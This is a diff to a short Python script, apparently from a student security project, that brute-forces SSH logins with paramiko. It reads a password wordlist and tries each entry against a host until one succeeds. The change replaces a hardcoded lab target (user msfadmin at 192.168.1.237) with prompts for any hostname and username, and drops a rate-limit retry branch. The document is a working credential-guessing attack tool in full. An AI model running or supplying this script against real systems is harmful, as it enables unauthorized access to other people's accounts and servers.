@@ -1,6 +1,5 @@
 import socket 
 import paramiko
-import time
 
 def crack(hostname, username, password):
     client = paramiko.SSHClient()
@@ -13,18 +12,16 @@ def crack(hostname, username, password):
     except paramiko.AuthenticationException:
         print(f"[!] Invalid credentials for {username}:{password}")
         returning = False
-    except paramiko.SSHException:
-        print(f"[*] Quota exceeded, retrying with delay...")
-        time.sleep(60)
-        returning = crack(hostname, username, password)
     else:
         print(f"[+] Found password:{password}")
         returning = True
     finally:
         client.close()
         return returning
-with open("./10-million-password-list-top-1000000.txt","r") as file:
+with open("/home/nukedukk/Main/edoc/project/BTL-ATTT/function/brute-force/password_list.txt","r") as file:
     lines = file.read().splitlines()
+hostname = input("Target hostname :")
+username = input("Target username :")
 for line in lines:
-    if crack("192.168.1.237","msfadmin",line):
+    if crack(hostname,username,line):
         break
